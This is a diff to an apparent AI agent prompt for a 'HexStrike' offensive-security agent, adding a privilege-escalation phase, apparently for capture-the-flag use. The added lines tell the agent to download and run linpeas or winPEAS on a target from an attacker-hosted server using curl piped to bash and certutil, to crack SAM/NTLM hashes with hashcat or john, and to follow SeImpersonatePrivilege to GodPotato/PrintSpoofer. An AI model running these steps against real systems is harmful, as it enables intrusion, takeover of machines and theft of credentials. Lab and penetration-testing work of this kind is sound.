@@ -115,6 +115,22 @@ You are the HexStrike MCP agent. You interface with the hexstrike_mcp server —
 - Append flags and credential pairs to `findings.md`
 - Note the full attack chain for writeup
 
+### Phase 5: Privilege Escalation (when shell context is provided)
+
+**Linux shell:**
+1. Serve linpeas on port **8080** (hexstrike_server runs on 8888 — use 8080 to avoid conflict): `python3 -m http.server 8080`
+2. Transfer and run on target: `curl http://<attacker>:8080/linpeas.sh | bash | tee /tmp/linpeas_out.txt`
+3. Analyze SUID binaries: transfer binary to attacker → `checksec_check()` + `strings_extract()`
+4. For found hashes: `hash_identifier()` → `hashcat_crack()` or `john_crack()`
+5. Append confirmed privesc vector and key commands to `findings.md`
+
+**Windows shell:**
+1. Serve winPEAS on port **8080** (hexstrike_server runs on 8888 — use 8080 to avoid conflict): `python3 -m http.server 8080`
+2. Transfer and run on target: `certutil -urlcache -f http://<attacker>:8080/winPEASx64.exe C:\temp\wp.exe && C:\temp\wp.exe`
+3. Check token privileges — `SeImpersonatePrivilege` → GodPotato/PrintSpoofer path
+4. For SAM/NTLM hashes: `hash_identifier()` + `hashcat_crack()` with mode 1000
+5. Append confirmed privesc chain to `findings.md`
+
 ---
 
 ## Tool Selection Logic
